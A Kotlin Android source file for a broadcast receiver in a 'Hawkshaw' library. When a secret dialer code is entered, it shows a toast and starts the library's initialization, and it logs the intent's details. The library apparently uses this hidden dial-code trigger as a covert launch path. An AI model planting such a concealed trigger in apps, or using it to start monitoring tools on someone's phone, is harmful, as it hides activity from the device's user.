package com.hawkshaw.library.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.widget.Toast
import com.hawkshaw.library.Hawkshaw
import com.hawkshaw.library.logger.Logger
import android.util.Log // Added for logging

/**
 * Broadcast receiver that handles secret dialer codes
 */
class SecretDialPadCodeReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "SecretDialPadCodeReceiver"
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        val intentAction = intent?.action
        val intentData = intent?.dataString // Secret code might be in the data URI
        val intentExtras = intent?.extras?.let { bundle ->
            bundle.keySet().joinToString { key -> "$key=${bundle.get(key)}" }
        } ?: "null"
        Log.d(TAG, "[DEBUG] onReceive called. Action: \"$intentAction\", Data: \"$intentData\", Extras: {$intentExtras}")

        if (context != null) {
            Log.d(TAG, "[DEBUG] onReceive: Context is not null.")
            // Show a toast notification
            Log.d(TAG, "[DEBUG] onReceive: Showing Toast with message \"Secret Code\".")
            Toast.makeText(context, "Secret Code", Toast.LENGTH_SHORT).show()
            
            // Log the event
            Logger.v(TAG, "Secret Code", false, 4, null)
            Log.d(TAG, "[DEBUG] onReceive: Logger.v called for \"Secret Code\".")

            // Check if the received action is a secret code
            Log.d(TAG, "[DEBUG] onReceive: Checking if intent action \"$intentAction\" matches \"android.provider.Telephony.SECRET_CODE\".")
            if (intent?.action == "android.provider.Telephony.SECRET_CODE") {
                Log.d(TAG, "[DEBUG] onReceive: Intent action is SECRET_CODE. Starting Hawkshaw initialization.")
                // Start the initialization process
                Hawkshaw.initFromInternalActivity(false)
                Log.d(TAG, "[DEBUG] onReceive: Hawkshaw.initFromInternalActivity(false) called.")
            } else {
                Log.d(TAG, "[DEBUG] onReceive: Intent action \"$intentAction\" is not SECRET_CODE.")
            }
        } else {
            Log.w(TAG, "[DEBUG] onReceive: Context is null. Cannot proceed.")
        }
        Log.d(TAG, "[DEBUG] onReceive completed for action: \"$intentAction\"")
    }
}
